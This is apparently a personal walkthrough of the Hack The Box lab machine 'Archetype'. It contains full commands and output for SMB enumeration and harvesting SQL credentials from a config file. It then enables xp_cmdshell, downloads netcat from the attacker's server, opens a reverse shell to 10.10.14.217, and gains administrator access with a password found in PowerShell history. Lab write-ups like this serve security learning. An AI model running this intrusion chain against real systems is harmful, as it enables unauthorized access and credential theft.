# Archetype (2023-12-21)

- ran nmap, discovered several open ports (`135, 139, 445, 1433`), run `nmap -sC -sV` against these ports:

  ```
  $ nmap 10.129.128.116 -sV -sC -oA nmap-archetype-scripts-2 -p135,139,445,1433
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-26 19:37 CET
  Nmap scan report for 10.129.128.116
  Host is up (0.030s latency).

  PORT     STATE SERVICE      VERSION
  135/tcp  open  msrpc        Microsoft Windows RPC
  139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
  445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
  1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
  |_ssl-date: 2023-12-26T19:37:46+00:00; +1h00m01s from scanner time.
  | ms-sql-ntlm-info:
  |   10.129.128.116:1433:
  |     Target_Name: ARCHETYPE
  |     NetBIOS_Domain_Name: ARCHETYPE
  |     NetBIOS_Computer_Name: ARCHETYPE
  |     DNS_Domain_Name: Archetype
  |     DNS_Computer_Name: Archetype
  |_    Product_Version: 10.0.17763
  | ms-sql-info:
  |   10.129.128.116:1433:
  |     Version:
  |       name: Microsoft SQL Server 2017 RTM
  |       number: 14.00.1000.00
  |       Product: Microsoft SQL Server 2017
  |       Service pack level: RTM
  |       Post-SP patches applied: false
  |_    TCP port: 1433
  | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
  | Not valid before: 2023-12-26T17:04:32
  |_Not valid after:  2053-12-26T17:04:32
  Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

  Host script results:
  | smb-security-mode:
  |   account_used: guest
  |   authentication_level: user
  |   challenge_response: supported
  |_  message_signing: disabled (dangerous, but default)
  | smb2-time:
  |   date: 2023-12-26T19:37:39
  |_  start_date: N/A
  | smb-os-discovery:
  |   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
  |   Computer name: Archetype
  |   NetBIOS computer name: ARCHETYPE\x00
  |   Workgroup: WORKGROUP\x00
  |_  System time: 2023-12-26T11:37:38-08:00
  | smb2-security-mode:
  |   3:1:1:
  |_    Message signing enabled but not required
  |_clock-skew: mean: 2h36m01s, deviation: 3h34m41s, median: 1h00m00s

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 27.00 seconds
  ```

- tried getting access to the sql server with `sqsh`, but this requires credentials (https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
- let's look at the samba share:

  ```
  $ smbclient -L //10.129.128.116/ -U guest
  Password for [WORKGROUP\guest]:

          Sharename       Type      Comment
          ---------       ----      -------
          ADMIN$          Disk      Remote Admin
          backups         Disk
          C$              Disk      Default share
          IPC$            IPC       Remote IPC
  Reconnecting with SMB1 for workgroup listing.
  do_connect: Connection to 10.129.128.116 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
  Unable to connect with SMB1 -- no workgroup available
  ```

- let's look at the backups share

  ```
  $ smbclient //10.129.128.116/backups -U guest
  Password for [WORKGROUP\guest]:
  Try "help" to get a list of possible commands.
  smb: \> ls
    .                                   D        0  Mon Jan 20 13:20:57 2020
    ..                                  D        0  Mon Jan 20 13:20:57 2020
    prod.dtsConfig                     AR      609  Mon Jan 20 13:23:02 2020

                  5056511 blocks of size 4096. 2615849 blocks available
  smb: \> get prod.dtsConfig
  getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
  ```

- now let's take a look at the downloaded file:

  ```
  $ cat prod.dtsConfig
  <DTSConfiguration>
      <DTSConfigurationHeading>
          <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
      </DTSConfigurationHeading>
      <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
          <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
      </Configuration>
  </DTSConfiguration>
  ```

- it appears that we have some credentials for the sql server: `Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;`
- we can manually connect to the server: `$ sqsh -S 10.129.128.116 -U ARCHETYPE\\sql_svc -P M3g4c0rp123`
- alternatively, and as suggested by the guide, we can use the impacket script `mssqlclient.py`

  ```
  $ python /usr/share/doc/python3-impacket/examples/mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.59.131 -windows-auth
  Impacket v0.11.0 - Copyright 2023 Fortra

  [*] Encryption required, switching to TLS
  [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
  [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
  [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
  [*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
  [*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
  [*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
  [!] Press help for extra shell commands
  SQL (ARCHETYPE\sql_svc  dbo@master)>
  ```

- according to https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#manual-enumeration we can see that there are only the system databases present:

  ```
  SQL (ARCHETYPE\sql_svc  dbo@master)> SELECT name, database_id, create_date FROM sys.databases;
  name     database_id   create_date
  ------   -----------   -----------
  master             1   2003-04-08 09:13:36

  tempdb             2   2023-12-27 07:25:51

  model              3   2003-04-08 09:13:36

  msdb               4   2017-08-22 19:39:22
  ```

  ## foothold

- so let's try to setup the mssql db for a reverse shell:

  ```
  SQL (ARCHETYPE\sql_svc  dbo@master)> sp_configure 'show advanced options', '1'
  [*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
  SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE
  SQL (ARCHETYPE\sql_svc  dbo@master)> sp_configure 'xp_cmdshell', '1'
  [*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
  SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE
  SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC master..xp_cmdshell 'whoami'
  output
  -----------------
  archetype\sql_svc

  NULL
  ```

  (as per https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#execute-os-commands)

- we can execute powershell commands with `XEC master..xp_cmdshell 'powershell -c pwd'`, for example
- so let's download `nc64.exe` first to our attack vm (e.g. https://github.com/int0x33/nc.exe/blob/master/nc64.exe), and then to the target...

  ```
  SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC master..xp_cmdshell 'powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.217:8080/nc64.exe -outfile nc64.exe'
  output
  ----------
  NULL

  SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC master..xp_cmdshell 'powershell -c cd C:\Users\sql_svc\Downloads; ls'output
  -----------------------------------------------------------------------------------------------------------------------
      Directory: C:\Users\sql_svc\Downloads


  Mode                LastWriteTime         Length Name

  ----                -------------         ------ ----

  -a----       12/27/2023   7:58 AM          45272 nc64.exe
  ```

- finally, establish the reverse shell with `SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC master..xp_cmdshell 'powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.217 1337'`.

## user flag

- in the reverse shell, let's cd to the users home and search for any text files..

  ```
  C:\Users\sql_svc\Downloads>cd ..
  cd ..

  C:\Users\sql_svc>dir /s *.txt
  dir /s *.txt
   Volume in drive C has no label.
   Volume Serial Number is 9565-0B4F

   Directory of C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine

  03/17/2020  01:36 AM                79 ConsoleHost_history.txt
                 1 File(s)             79 bytes

   Directory of C:\Users\sql_svc\Desktop

  02/25/2020  06:37 AM                32 user.txt
                 1 File(s)             32 bytes

       Total Files Listed:
                 2 File(s)            111 bytes
                 0 Dir(s)  10,717,392,896 bytes free
  ```

- the flag is in the users Download directory.
  ```
  C:\Users\sql_svc>type Desktop\user.txt
  type Desktop\user.txt
  3e7b102e78218e935bf3f4951fec21a3
  ```

## privilege escalation

- let's enumerate the system with winPEAS. download it from here https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe and then serve it through our already running http server.
- download it to the target. first, let's upgrade our shell to powershell with `powershell`.
- then run `wget http://10.10.14.217:8080/winPEASx64.exe -outfile wp64.exe`
- we can see that we have the SeImpersonatePrivilege
  ```
  ����������͹ Current Token privileges
  � Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#token-manipulation
    SeAssignPrimaryTokenPrivilege: DISABLED
    SeIncreaseQuotaPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: DISABLED
  ```
- the winpeas script didn't catch this, but the writeup suggests to also check the PowerShell equivalent of the `.bash_hiostory`, which is located under `C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\`
  ```
  PS C:\Users\sql_svc> cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\
  PS C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> type ConsoleHost_history.txt
  type ConsoleHost_history.txt
  net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
  ```
  there is the admin password!
- let's use `psexec.py` from impacket to login:

  ```
  $ python /usr/share/doc/python3-impacket/examples/psexec.py administrator@10.129.59.131
  Impacket v0.11.0 - Copyright 2023 Fortra

  Password:
  [*] Requesting shares on 10.129.59.131.....
  [*] Found writable share ADMIN$
  [*] Uploading file CerDSEFZ.exe
  [*] Opening SVCManager on 10.129.59.131.....
  [*] Creating service MWJw on 10.129.59.131.....
  [*] Starting service MWJw.....
  [!] Press help for extra shell commands
  Microsoft Windows [Version 10.0.17763.2061]
  (c) 2018 Microsoft Corporation. All rights reserved.

  C:\Windows\system32>
  ```

## root flag

- just like the user flag, the root flag sits on the administrator's desktop.
  ```
  C:\Users\Administrator\Desktop> type root.txt
  b91ccec3305e98240082d4474b848528
  ```
